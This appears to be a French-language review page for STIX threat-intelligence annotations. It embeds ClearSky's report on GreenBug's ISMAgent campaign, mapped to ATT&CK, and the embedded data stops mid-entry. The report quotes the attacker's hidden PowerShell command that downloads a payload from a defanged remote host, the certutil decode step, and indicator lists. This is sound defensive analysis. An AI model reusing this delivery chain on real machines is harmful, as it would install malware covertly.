<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Revue · Recent ISMAgent Samples and Infrastructure by Iranian Threat Group GreenBug</title>
<style>
:root{
  --bg:#f5f6f8; --surface:#ffffff; --surface-2:#f1f3f6; --surface-3:#e6e9ee;
  --text:#1a1d23; --muted:#59626e; --faint:#8a929c; --border:#dde1e7; --border-strong:#c6ccd5;
  --accent:#2b59c3; --accent-ink:#ffffff;
  --ok:#1b7a47; --ok-bg:#e2f3e9; --fix:#9a5a00; --fix-bg:#fcefd9; --ko:#bf2e29; --ko-bg:#fbe4e3;
  --info:#355f9e; --info-bg:#e6eef9;
  --mark:#fde68f; --mark-multi:#f7c955; --mark-focus:#ffae2b;
  --c-campaign:#7646b3; --c-intrusion-set:#bb3529; --c-threat-actor:#bb3529; --c-malware:#c4531a;
  --c-tool:#1c7575; --c-attack-pattern:#2b59c3; --c-location:#2a8650; --c-identity:#7a6526; --c-other:#69717c;
  --radius:10px; --shadow:0 1px 2px rgba(16,24,40,.06);
  --mono:ui-monospace,SFMono-Regular,"JetBrains Mono",Menlo,Consolas,monospace;
  --sans:system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
  --hdr:150px;
  color-scheme: light;
}
@media (prefers-color-scheme: dark){ :root:not([data-theme="light"]){ 
  --bg:#0f1216; --surface:#171b21; --surface-2:#1e232b; --surface-3:#272d36;
  --text:#e6e9ee; --muted:#a3abb6; --faint:#7a828d; --border:#2a3039; --border-strong:#3a424d;
  --accent:#7aa2ff; --accent-ink:#0f1216;
  --ok:#4cc38a; --ok-bg:#132b1d; --fix:#f0a73a; --fix-bg:#33260f; --ko:#ff6b63; --ko-bg:#3a1715;
  --info:#8ab8ff; --info-bg:#172540;
  --mark:#5a4a14; --mark-multi:#7d6114; --mark-focus:#b87400;
  --c-campaign:#b88cf2; --c-intrusion-set:#ff8174; --c-threat-actor:#ff8174; --c-malware:#ff9d62;
  --c-tool:#52c9c4; --c-attack-pattern:#86a9ff; --c-location:#62d394; --c-identity:#d1b870; --c-other:#9aa3ad;
  --shadow:0 1px 2px rgba(0,0,0,.4);
  color-scheme: dark;
 } }
:root[data-theme="dark"]{ 
  --bg:#0f1216; --surface:#171b21; --surface-2:#1e232b; --surface-3:#272d36;
  --text:#e6e9ee; --muted:#a3abb6; --faint:#7a828d; --border:#2a3039; --border-strong:#3a424d;
  --accent:#7aa2ff; --accent-ink:#0f1216;
  --ok:#4cc38a; --ok-bg:#132b1d; --fix:#f0a73a; --fix-bg:#33260f; --ko:#ff6b63; --ko-bg:#3a1715;
  --info:#8ab8ff; --info-bg:#172540;
  --mark:#5a4a14; --mark-multi:#7d6114; --mark-focus:#b87400;
  --c-campaign:#b88cf2; --c-intrusion-set:#ff8174; --c-threat-actor:#ff8174; --c-malware:#ff9d62;
  --c-tool:#52c9c4; --c-attack-pattern:#86a9ff; --c-location:#62d394; --c-identity:#d1b870; --c-other:#9aa3ad;
  --shadow:0 1px 2px rgba(0,0,0,.4);
  color-scheme: dark;
 }

*{box-sizing:border-box}
html{-webkit-text-size-adjust:100%}
body{margin:0;background:var(--bg);color:var(--text);font:15px/1.5 var(--sans)}
button,input,select,textarea{font:inherit;color:inherit}
button{cursor:pointer}
a{color:var(--accent)}
:focus-visible{outline:2px solid var(--accent);outline-offset:2px}

/* En-tête */
header.top{position:sticky;top:0;z-index:20;background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(8px);border-bottom:1px solid var(--border)}
.top-inner{max-width:1320px;margin:0 auto;padding:14px 16px 0}
.title-row{display:flex;gap:16px;align-items:flex-start;justify-content:space-between;flex-wrap:wrap}
.eyebrow{font:600 11.5px/1.2 var(--sans);letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
h1{font-size:20px;line-height:1.25;margin:3px 0 2px;font-weight:700;overflow-wrap:anywhere}
.files{font:12px/1.4 var(--mono);color:var(--faint);overflow-wrap:anywhere}
.tools{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
.tools input[type=text]{width:150px}
.btn{border:1px solid var(--border-strong);background:var(--surface);border-radius:8px;padding:6px 11px;font-size:13.5px;font-weight:500;line-height:1.2}
.btn:hover{background:var(--surface-2)}
.btn.primary{background:var(--accent);color:var(--accent-ink);border-color:var(--accent)}
.btn.primary:hover{filter:brightness(1.07)}
.stats{display:flex;gap:6px;flex-wrap:wrap;margin:10px 0 8px}
.stat{display:inline-flex;gap:6px;align-items:baseline;border:1px solid var(--border);background:var(--surface);border-radius:999px;padding:3px 10px;font-size:12.5px;color:var(--muted)}
.stat b{color:var(--text);font-variant-numeric:tabular-nums}
button.stat:hover{border-color:var(--border-strong)}
.stat.s-error b{color:var(--ko)} .stat.s-warn b{color:var(--fix)}
.progress{display:flex;align-items:center;gap:10px;font-size:12.5px;color:var(--muted)}
.bar{flex:1;height:6px;border-radius:99px;background:var(--surface-3);overflow:hidden;display:flex}
.bar span{display:block;height:100%}
.bar .p-ok{background:var(--ok)} .bar .p-fix{background:var(--fix)} .bar .p-ko{background:var(--ko)}
nav.tabs{display:flex;gap:2px;margin-top:10px;overflow-x:auto;scrollbar-width:none}
nav.tabs button{border:0;background:none;padding:9px 14px 10px;border-bottom:2px solid transparent;font-weight:600;font-size:14px;color:var(--muted);white-space:nowrap}
nav.tabs button[aria-selected=true]{color:var(--text);border-bottom-color:var(--accent)}
nav.tabs .n{font-weight:500;color:var(--faint);margin-left:4px;font-variant-numeric:tabular-nums}

/* Mise en page */
.layout{max-width:1320px;margin:0 auto;padding:18px 16px 80px;display:grid;grid-template-columns:250px minmax(0,1fr);gap:22px}
.layout.full{grid-template-columns:minmax(0,1fr)}
aside.filters{position:sticky;top:calc(var(--hdr) + 14px);align-self:start;max-height:calc(100vh - var(--hdr) - 28px);overflow:auto;display:flex;flex-direction:column;gap:12px;padding-right:2px}
.layout.full aside.filters{display:none}
.field{display:flex;flex-direction:column;gap:4px}
.field label,.field .lab{font-size:12px;font-weight:600;color:var(--muted)}
.field input[type=search],.field select,.tools input{width:100%;border:1px solid var(--border-strong);background:var(--surface);border-radius:8px;padding:6px 9px;font-size:13.5px}
.check{display:flex;gap:8px;align-items:center;font-size:13.5px}
#f-toggle{display:none;align-self:end}
.hint{font-size:12px;color:var(--faint);line-height:1.5;border-top:1px solid var(--border);padding-top:10px}
kbd{font:11px var(--mono);border:1px solid var(--border-strong);border-bottom-width:2px;border-radius:4px;padding:0 4px;background:var(--surface)}
.global{border:1px solid var(--border);background:var(--surface);border-radius:var(--radius);padding:10px 14px;margin-bottom:14px}
.global h2{font-size:13px;margin:0 0 4px;color:var(--muted);font-weight:600}
.listhead{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-bottom:10px;font-size:13px;color:var(--muted);flex-wrap:wrap}
.focusbar{display:flex;justify-content:space-between;gap:10px;align-items:center;border:1px solid var(--accent);background:color-mix(in srgb,var(--accent) 8%,var(--surface));border-radius:var(--radius);padding:8px 12px;margin-bottom:12px;font-size:13.5px}
h3.group{font-size:13px;font-weight:700;color:var(--muted);margin:22px 0 8px;letter-spacing:.02em;display:flex;gap:8px;align-items:center}
h3.group:first-child{margin-top:0}
.empty{padding:40px;text-align:center;color:var(--muted);border:1px dashed var(--border-strong);border-radius:var(--radius)}

/* Cartes */
.card{background:var(--surface);border:1px solid var(--border);border-left:4px solid var(--border);border-radius:var(--radius);padding:14px 16px;margin-bottom:12px;box-shadow:var(--shadow);scroll-margin-top:calc(var(--hdr) + 16px)}
.card.v-ok{border-left-color:var(--ok)} .card.v-fix{border-left-color:var(--fix)} .card.v-ko{border-left-color:var(--ko)}
.card.cur{outline:2px solid color-mix(in srgb,var(--accent) 55%,transparent);outline-offset:1px}
.card.flash{animation:flash 1.2s ease-out}
@keyframes flash{0%{box-shadow:0 0 0 4px color-mix(in srgb,var(--accent) 45%,transparent)}100%{box-shadow:var(--shadow)}}
.triplet{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.spacer{flex:1}
.node{--c:var(--c-other);display:inline-flex;flex-direction:column;gap:1px;padding:5px 10px 6px;border-radius:8px;border:1px solid color-mix(in srgb,var(--c) 30%,var(--border));border-left:3px solid var(--c);background:color-mix(in srgb,var(--c) 8%,var(--surface));min-width:0;max-width:100%}
.node .ntype{font:600 11px/1.25 var(--mono);color:var(--c)}
.node .nname{font-weight:600;font-size:14.5px;line-height:1.3;overflow-wrap:anywhere}
.node .nsub{font-size:11.5px;color:var(--muted)}
.node.sm{padding:2px 8px 3px}.node.sm .nname{font-size:13px}
.t-campaign{--c:var(--c-campaign)} .t-intrusion-set{--c:var(--c-intrusion-set)} .t-threat-actor{--c:var(--c-threat-actor)}
.t-malware{--c:var(--c-malware)} .t-tool{--c:var(--c-tool)} .t-attack-pattern{--c:var(--c-attack-pattern)}
.t-location{--c:var(--c-location)} .t-identity{--c:var(--c-identity)} .t-missing{--c:var(--ko)}
.edge{display:inline-flex;align-items:center;gap:6px;font:600 12.5px var(--mono);color:var(--muted)}
.edge .ln{width:14px;height:1.5px;background:var(--border-strong)}
.lbl{font:600 11.5px/1 var(--sans);border-radius:999px;padding:4px 9px;white-space:nowrap}
.lbl-req{background:var(--accent);color:var(--accent-ink)}
.lbl-acc{border:1.5px solid var(--accent);color:var(--accent);padding:3px 8px}
.lbl-other,.lbl-none{border:1.5px dashed var(--ko);color:var(--ko);padding:3px 8px}
.conf{font:12px var(--mono);color:var(--muted)}
ul.flags{list-style:none;padding:0;margin:10px 0 0;display:flex;flex-direction:column;gap:4px}
.flag{font-size:13px;border-radius:6px;padding:4px 9px;display:flex;gap:7px;align-items:baseline}
.flag span{font-size:10px}
.f-error{background:var(--ko-bg);color:var(--ko)} .f-warn{background:var(--fix-bg);color:var(--fix)} .f-info{background:var(--info-bg);color:var(--info)}
.quote{margin-top:12px}
blockquote.ctx{margin:0;padding:10px 13px;background:var(--surface-2);border-radius:8px;border-left:3px solid var(--border-strong);font-size:14px;line-height:1.6;white-space:pre-line;overflow-wrap:anywhere;color:var(--muted)}
blockquote.ctx mark{background:var(--mark);color:var(--text);border-radius:3px;padding:1px 0;box-decoration-break:clone;-webkit-box-decoration-break:clone}
.ctx-missing{padding:10px 13px;border-radius:8px;border:1.5px dashed var(--ko);background:var(--ko-bg);font-size:14px}
.ctx-missing .qraw{color:var(--ko);font-weight:500}
.ctx-missing .cand{margin-top:6px;color:var(--muted);font-size:13px}
.where{display:flex;flex-wrap:wrap;gap:6px 12px;align-items:center;margin-top:6px;font-size:12.5px;color:var(--muted)}
.where .sec{overflow-wrap:anywhere}
.where .actions{margin-left:auto;display:flex;gap:6px}
.occ{display:inline-flex;gap:4px;align-items:center;font-variant-numeric:tabular-nums}
.mini{border:1px solid var(--border);background:var(--surface);border-radius:6px;padding:2px 8px;font-size:12px;color:var(--muted)}
.mini:hover:not(:disabled){color:var(--text);border-color:var(--border-strong)}
.mini:disabled{opacity:.4;cursor:default}
.qstatus{font-weight:600;border-radius:4px;padding:0 6px}
.qs-normalized{background:var(--info-bg);color:var(--info)} .qs-fuzzy{background:var(--fix-bg);color:var(--fix)}
.just{margin:10px 0 0;font-size:13.5px;color:var(--muted)}
.just strong{color:var(--text);font-weight:600;margin-right:6px}
.extra{margin:8px 0 0;font:12px/1.5 var(--mono);color:var(--faint);overflow-wrap:anywhere}
.verdict{display:flex;gap:10px;align-items:flex-start;margin-top:12px;padding-top:12px;border-top:1px solid var(--border);flex-wrap:wrap}
.vbtns{display:inline-flex;border:1px solid var(--border-strong);border-radius:8px;overflow:hidden;flex-shrink:0}
.vbtn{border:0;background:var(--surface);padding:6px 11px;font-size:13px;font-weight:600;color:var(--muted);border-right:1px solid var(--border)}
.vbtn:last-child{border-right:0}
.vbtn:hover{background:var(--surface-2);color:var(--text)}
.vbtn.vb-ok.on{background:var(--ok);color:#fff} .vbtn.vb-fix.on{background:var(--fix);color:#fff} .vbtn.vb-ko.on{background:var(--ko);color:#fff}
.vcomment{flex:1;min-width:200px;border:1px solid var(--border);background:var(--surface);border-radius:8px;padding:6px 9px;font-size:13.5px;resize:vertical;min-height:34px}
.stale{font-size:12.5px;color:var(--fix);width:100%}
.ent-head{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
.attack{font-size:13px;margin-top:8px;display:flex;gap:6px;align-items:center}
.attack.a-ok{color:var(--ok)} .attack.a-error{color:var(--ko)} .attack.a-warn{color:var(--fix)} .attack.a-unchecked{color:var(--muted)}
.meta-line{font-size:13px;color:var(--muted);margin-top:6px;overflow-wrap:anywhere}
.desc{font-size:14px;margin:8px 0 0}
.mitre{margin-top:10px;border:1px solid color-mix(in srgb,var(--c-attack-pattern) 25%,var(--border));background:color-mix(in srgb,var(--c-attack-pattern) 5%,var(--surface));border-radius:8px;padding:9px 12px;font-size:13.5px;line-height:1.55}
.mitre-head{display:flex;justify-content:space-between;gap:4px 12px;flex-wrap:wrap;font-size:11.5px;font-weight:600;color:var(--c-attack-pattern);letter-spacing:.03em;margin-bottom:4px}
.mitre-head a{font-weight:500;white-space:nowrap}
.mitre p{margin:0 0 6px;overflow-wrap:anywhere}
.mitre > p:last-child{margin-bottom:0}
.mitre details summary{cursor:pointer;color:var(--muted);font-size:12.5px}
.mitre details[open] summary{margin-bottom:6px}
details.seq{margin-top:10px;font-size:13.5px}
details.seq summary{cursor:pointer;color:var(--muted);font-weight:600}
details.seq ol{margin:8px 0 0;padding-left:22px}
details.seq li{margin-bottom:6px}
.tid{font:600 11.5px var(--mono);color:var(--c-attack-pattern);background:color-mix(in srgb,var(--c-attack-pattern) 10%,transparent);border-radius:4px;padding:0 5px;margin-right:3px;white-space:nowrap}
.tid.acc{background:none;border:1px dashed var(--c-attack-pattern)}

/* Matrice */
.matrix-wrap{overflow-x:auto;border:1px solid var(--border);border-radius:var(--radius);background:var(--surface)}
table.matrix{border-collapse:separate;border-spacing:0;font-size:13px;min-width:100%}
.matrix th,.matrix td{border-bottom:1px solid var(--border);padding:6px 8px;text-align:center;vertical-align:middle}
.matrix thead th{position:sticky;top:0;background:var(--surface-2);font-weight:600;z-index:1;vertical-align:bottom}
.matrix thead .node .nname{white-space:nowrap}
.matrix th.rowh{text-align:left;position:sticky;left:0;background:var(--surface);z-index:2;min-width:220px;max-width:300px;font-weight:500}
.matrix thead th.rowh{background:var(--surface-2);z-index:3}
.matrix .tname{display:block;font-weight:600;overflow-wrap:anywhere}
.matrix .ttac{display:block;font-size:11.5px;color:var(--faint)}
.matrix tbody tr:hover td,.matrix tbody tr:hover th{background:var(--surface-2)}
.cell{border:0;background:none;padding:2px;display:inline-flex;gap:3px;align-items:center}
.cell .b{font:700 11px/1 var(--sans);border-radius:5px;padding:4px 6px}
.cell .b.req{background:var(--accent);color:var(--accent-ink)} .cell .b.acc{border:1.5px solid var(--accent);color:var(--accent);padding:3px 5px}
.cell .vm{font-size:12px;font-weight:700}
.vm.ok{color:var(--ok)} .vm.fix{color:var(--fix)} .vm.ko{color:var(--ko)}
.cell.al .b{box-shadow:0 0 0 2px var(--fix)}
.legend{display:flex;gap:14px;flex-wrap:wrap;font-size:12.5px;color:var(--muted);margin-bottom:10px;align-items:center}

/* Article */
.article{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:22px 26px;font-size:14.5px;line-height:1.6;max-width:900px}
.article .l{white-space:pre-wrap;overflow-wrap:anywhere;min-height:.6em}
.article .h2{font-size:19px;font-weight:700;margin:18px 0 6px} .article .h3{font-size:16.5px;font-weight:700;margin:14px 0 4px}
.article .h4,.article .h5,.article .h6{font-size:15px;font-weight:700;margin:12px 0 2px} .article .hb{font-weight:700}
.article .h1{font-size:22px;font-weight:700;margin-bottom:8px}
mark.am{background:var(--mark);color:inherit;border-radius:2px;cursor:pointer;box-decoration-break:clone;-webkit-box-decoration-break:clone}
mark.am.multi{background:var(--mark-multi)}
mark.am:hover{outline:1px solid var(--fix)}
mark.am.hot{background:var(--mark-focus);color:#1a1d23}
.panel{position:fixed;right:16px;bottom:16px;width:min(440px,calc(100vw - 32px));max-height:55vh;overflow:auto;background:var(--surface);border:1px solid var(--border-strong);border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.18);padding:12px 14px;z-index:30}
.panel h2{font-size:13.5px;margin:0 0 8px;display:flex;justify-content:space-between;align-items:center}
.panel .pi{display:flex;flex-direction:column;gap:6px;padding:8px 0;border-top:1px solid var(--border)}
.panel .pi .triplet{gap:6px}

@media (max-width:900px){
  .layout{grid-template-columns:minmax(0,1fr)}
  aside.filters{position:static;max-height:none;display:grid;grid-template-columns:1fr 1fr;gap:10px}
  aside.filters #f-toggle{display:block}
  aside.filters:not(.open) > :not(.always){display:none}
  aside.filters .hint{display:none}
}
@media (max-width:560px){
  aside.filters{grid-template-columns:1fr}
  .card{padding:12px}
  .article{padding:16px}
  .where .actions{margin-left:0}
  h1{font-size:18px}
}
</style>

<body>
<header class="top" id="top">
  <div class="top-inner">
    <div class="title-row">
      <div style="min-width:0;flex:1">
        <div class="eyebrow">Revue gold STIX 2.1</div>
        <h1 id="r-title"></h1>
        <div class="files" id="r-files"></div>
      </div>
      <div class="tools">
        <input type="text" id="reviewer" placeholder="Analyste" aria-label="Nom de l'analyste">
        <button class="btn primary" id="btn-export" type="button">Exporter les verdicts</button>
        <label class="btn" for="file-import" style="margin:0">Importer</label>
        <input type="file" id="file-import" accept="application/json,.json" hidden>
        <button class="btn" id="btn-theme" type="button" aria-label="Changer de thème">◐</button>
      </div>
    </div>
    <div class="stats" id="stats"></div>
    <div class="progress"><div class="bar" id="bar"></div><span id="progress-txt"></span></div>
    <nav class="tabs" role="tablist" id="tabs"></nav>
  </div>
</header>

<div class="layout" id="layout">
  <aside class="filters" id="filters" aria-label="Filtres">
    <div class="field always"><label for="f-q">Recherche</label><input type="search" id="f-q" placeholder="Nom, T-ID, citation…"></div>
    <button class="btn always" type="button" id="f-toggle" aria-expanded="false">Filtres et tri</button>
    <div class="field"><label for="f-entity">Entité (source ou cible)</label><select id="f-entity"></select></div>
    <div class="field" data-only="relations"><label for="f-rtype">Type de relation</label><select id="f-rtype"></select></div>
    <div class="field"><label for="f-ttype" id="f-ttype-lab">Type de cible</label><select id="f-ttype"></select></div>
    <div class="field"><label for="f-label">Label gold</label><select id="f-label">
      <option value="">Tous</option><option value="gold:required">required</option><option value="gold:acceptable">acceptable</option></select></div>
    <div class="field"><label for="f-status">Verdict</label><select id="f-status">
      <option value="">Tous</option><option value="pending">À revoir</option><option value="ok">Correct</option><option value="fix">À corriger</option><option value="ko">Non justifié</option></select></div>
    <div class="field"><label for="f-sort">Tri</label><select id="f-sort">
      <option value="alerts">Alertes d'abord</option><option value="source">Par source</option><option value="target">Par cible</option><option value="bundle">Ordre du bundle</option></select></div>
    <label class="check"><input type="checkbox" id="f-alerts"> Seulement avec alerte</label>
    <button class="btn" type="button" id="f-reset">Réinitialiser les filtres</button>
    <div class="hint">

<script type="application/json" id="review-data">{"meta": {"key": "bundle--9d0f3e2a-d013-5168-a055-8e287890beb0", "bundle_file": "clearsky_ismagent_greenbug_gold.json", "bundle_stem": "clearsky_ismagent_greenbug_gold", "article_file": "2017-08-28 - Recent ISMAgent Samples and Infrastructure by Iranian Threat Group GreenBug.md", "report_name": "Recent ISMAgent Samples and Infrastructure by Iranian Threat Group GreenBug", "report_desc": "ClearSky décrit une nouvelle campagne diffusant ISMAgent, trojan de GreenBug : document .dot exploitant CVE-2017-0199, PowerShell qui télécharge un fichier déguisé en certificat base64, décodé par certutil. Annexe d'IOCs (hors périmètre).", "url": "https://www.clearskysec.com/ismagent/", "attack_version": "20.0", "declared_attack_version": "20.0", "generated": "2026-10-26 13:32"}, "article": {"text": "# Recent ISMAgent Samples and Infrastructure by Iranian Threat Group GreenBug\n\n- **Source :** ClearSky Cybersecurity\n- **URL :** https://www.clearskysec.com/ismagent/\n- **Date :** 2017-08-28\n\n---\n\nRecently we detected new samples and Infrastructure of [ISMAgent, ](https://researchcenter.paloaltonetworks.com/2017/07/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/) a trojan in use by Iranian Threat Group GreenBug. Interestingly, as part of the delivery mechanism, the malware is disguised as a base64 digital certificate and decoded via certutil.exe. This post describes the new campaign.\n\n## change managment.dot\n\nSample _change managment.dot_ ([812d3c4fddf9bb81d507397345a29bb0](https://www.virustotal.com/en/file/66358a295b8b551819e053f2ee072678605a5f2419c1c486e454ab476c40ed6a/analysis/)) exploits CVE-2017-0199 and calls the following URL:\n\nhttp://www.msoffice-cdn[.]com/updatecdnsrv/prelocated/owa/auth/template.rtf\n\n![](https://www.clearskysec.com/wp-content/uploads/2017/08/Screenshot_3.jpg)\n\nwhich in turn runs this command:\n\n_“C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe” -nologo -WindowStyle Hidden $webClient = New-Object http://System.Net .WebClient; $val = $webClient.DownloadString(‘**https://a.pomf[.]cat/ntluca.txt** ‘); add-content -path ‘C:\\Users\\USER\\AppData\\Roaming/srvRep.txt’ -value $val -force_\n\nThe command downloads  _ntluca.txt_ from  _http://a.pomf[.]cat/ntluca.txt._\n\n![](https://www.clearskysec.com/wp-content/uploads/2017/08/Screenshot_2.jpg)\n\nDisguised as a base64 digital certificate, the file actually decodes to an ISMagent sample ([96b47c5af8652ac99150bf602a88498b](https://www.virustotal.com/en/file/33c187cfd9e3b68c3089c27ac64a519ccc951ccb3c74d75179c520f54f11f647/analysis/)) via the following command:\n\n_C:\\Windows\\System32\\certutil.exe” -decode C:\\Users\\USER\\AppData\\Roaming\\srvRep.txt C:\\Users\\USER\\AppData\\Roaming\\srvConhost.exe_\n\n## Indicators of compromise\n\nIndicators of compromise are presented below and are [available on PassiveTotal](https://community.riskiq.com/projects/960320d5-f911-b4e5-05a7-9fabe4e145c9).\n\nDomain | cdnmsnupdate[.]com  \n---|---  \nDomain | msoffice-cdn[.]com  \nURL | http://74.91.19[.]122/action2/  \nURL | http://82.102.14[.]246/webdav/aws.exe  \nURL | http://www.msoffice-cdn[.]com/updatecdnsrv/prelocated/owa/auth/template.rtf  \nURL | http://a.pomf[.]cat/ntluca.txt  \nIP | 185.162.235.121  \nIP | 82.102.14.246  \nIP | 74.91.19.122  \nHash | 6d2f8a06534e2ebebc43295fb266a8ca  \nHash | 812d3c4fddf9bb81d507397345a29bb0  \nHash | 3d497c4711c0226d86a693a40891f9a1  \nHash | 96b47c5af8652ac99150bf602a88498b  \nHash | 66eaef10226fb279dba64bb5948bc85b  \nHash | 7d83715a9a6aabcbc621cc786de0c9ea  \nHash | 15d9d184b71d243ae5c005c68a045889  \nwhoisName | Neslihan Ozcivit  \nwhoisEmail | neslihan.ozcivit@mail.ru  \nFilename | aws.exe  \nFilename | Crypted.exe  \nFilename | document-gerenated-problem.exe  \nFilename | PolicyConverter.exe  \n  \nThe Maltego graph below depicts the relationship among the indicators (click to enlarge):\n\n[![](https://www.clearskysec.com/wp-content/uploads/2017/08/ISMAgent-550x236.jpg)](https://www.clearskysec.com/wp-content/uploads/2017/08/ISMAgent.jpg)"}, "global_flags": [], "entities": [{"id": "intrusion-set--f1a371ab-5eb3-5bd4-b46c-84343338a5b8", "kind": "entity", "type": "intrusion-set", "name": "GreenBug", "ext_id": null, "label": "gold:required", "quotes": [{"text": "a trojan in use by Iranian Threat Group GreenBug", "anchor": {"status": "exact", "occurrences": [{"start": 392, "end": 440, "section": []}]}}], "flags": [], "severity": 0, "description": "Groupe de menace iranien auquel l'article attribue le trojan ISMAgent et les nouveaux échantillons et infrastructures décrits.", "aliases": [], "tactics": [], "attack": null, "rel_count": 2, "sequence": null, "extra": {}, "fp": "d7a5ad473b31"}, {"id": "malware--78d43467-c455-5ad5-b2e4-c73b95d74930", "kind": "entity", "type": "malware", "name": "ISMAgent", "ext_id": null, "label": "gold:required", "quotes": [{"text": "Recent ISMAgent Samples and Infrastructure by Iranian Threat Group GreenBug", "anchor": {"status": "exact", "occurrences": [{"start": 2, "end": 77, "section": []}]}}], "flags": [], "severity": 0, "description": "Trojan utilisé par GreenBug. Charge finale de la chaîne décrite : livré encodé en base64 sous l'apparence d'un certificat numérique, puis décodé par certutil.", "aliases": ["ISMagent"], "tactics": [], "attack": null, "rel_count": 2, "sequence": null, "extra": {}, "fp": "321382acde8a"}, {"id": "campaign--6b69cc1f-b800-509a-bf4c-373bc1c45a05", "kind": "entity", "type": "campaign", "name": "Nouvelle campagne ISMAgent (ClearSky, août 2017)", "ext_id": null, "label": "gold:required", "quotes": [{"text": "This post describes the new campaign.", "anchor": {"status": "exact", "occurrences": [{"start": 579, "end": 616, "section": []}]}}], "flags": [], "severity": 0, "description": "Campagne de diffusion d'ISMAgent : document .dot exploitant CVE-2017-0199, commande PowerShell téléchargeant un fichier déguisé en certificat base64, décodé par certutil en échantillon ISMAgent.", "aliases": [], "tactics": [], "attack": null, "rel_count": 11, "sequence": [{"order": 1, "summary": "L'échantillon .dot exploite CVE-2017-0199 et appelle une URL distante (template.rtf).", "techniques": ["T1203"]}, {"order": 2, "summary": "Exécution d'une commande PowerShell en fenêtre masquée qui télécharge un fichier texte et l'écrit dans AppData\\Roaming.", "techniques": ["T1059.001", "T1105"], "techniques_acceptable": ["T1564.003"]}, {"order": 3, "summary": "Le fichier, déguisé en certificat numérique base64, est décodé par certutil -decode en exécutable : un échantillon ISMAgent.", "techniques": ["T1027.013", "T1140"]}], "extra": {}, "fp": "d0bd3a5b3102"}, {"id": "vulnerability--c8ea031e-7c99-56a7-b275-f0d74a21d834", "kind": "entity", "type": "vulnerability", "name": "CVE-2017-0199", "ext_id": null, "label": "gold:required", "quotes": [{"text": "exploits CVE-2017-0199 and calls the following URL", "anchor": {"status": "exact", "occurrences": [{"start": 821, "end": 871, "section": ["change managment.dot"]}]}}], "flags": [], "severity": 0, "description": "Vulnérabilité exploitée par l'échantillon .dot de la campagne ; son exploitation conduit à l'appel d'une URL distante puis à l'exécution d'une commande PowerShell.", "aliases": [], "tactics": [], "attack": null, "rel_count": 2, "sequence": null, "extra": {}, "fp": "6cf6ec810eef"}, {"id": "tool--0a68f1f1-da74-4d28-8d9a-696c082706cc", "kind": "entity", "type": "tool", "name": "certutil", "ext_id": "S0160", "label": "gold:required", "quotes": [{"text": "the malware is disguised as a base64 digital certificate and decoded via certutil.exe", "anchor": {"status": "exact", "occurrences": [{"start": 492, "end": 577, "section": []}]}}], "flags": [], "severity": 0, "description": "Utilitaire Windows employé pour décoder le fichier base64 en échantillon ISMAgent (certutil.exe -decode).", "aliases": ["certutil.exe"], "tactics": [], "attack": {"status": "ok", "msg": "S0160 certutil (ATT&CK v20.0)", "official": "certutil", "description": "certutil is a command-line utility that can be used to obtain certificate authority information and configure Certificate Services.", "url": "https://attack.mitre.org/software/S0160"}, "rel_count": 2, "sequence": null, "extra": {}, "fp": "500b3f170949"}, {"id": "tool--13b3e559-ce6c-55d1-9f03-1c17f8c38f37", "kind": "entity", "type": "tool", "name": "PowerShell", "ext_id": null, "label": "gold:acceptable", "quotes": [{"text": "“C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe” -nologo -WindowStyle Hidden", "anchor": {"status": "exact", "occurrences": [{"start": 1064, "end": 1151, "section": ["change managment.dot"]}]}}], "flags": [], "severity": 0, "description": "Interpréteur lancé après l'exploitation de CVE-2017-0199 pour télécharger le fichier encodé (WebClient.DownloadString).", "aliases": ["powershell.exe"], "tactics": [], "attack": null, "rel_count": 1, "sequence": null, "extra": {"x_gold_context": "Artefact : la commande citée dans la section « change managment.dot ». Recouvre la technique requise T1059.001 ; PowerShell n'est pas un logiciel ATT&CK."}, "fp": "3362562c0f05"}, {"id": "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63", "kind": "entity", "type": "attack-pattern", "name": "Exploitation for Client Execution", "ext_id": "T1203", "label": "gold:required", "quotes": [{"text": "exploits CVE-2017-0199 and calls the following URL", "anchor": {"status": "exact", "occurrences": [{"start": 821, "end": 871, "section": ["change managment.dot"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["execution"], "attack": {"status": "ok", "msg": "T1203 Exploitation for Client Execution (ATT&CK v20.0)", "official": "Exploitation for Client Execution", "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.", "url": "https://attack.mitre.org/techniques/T1203"}, "rel_count": 2, "sequence": null, "extra": {}, "fp": "13b486b40406"}, {"id": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736", "kind": "entity", "type": "attack-pattern", "name": "PowerShell", "ext_id": "T1059.001", "label": "gold:required", 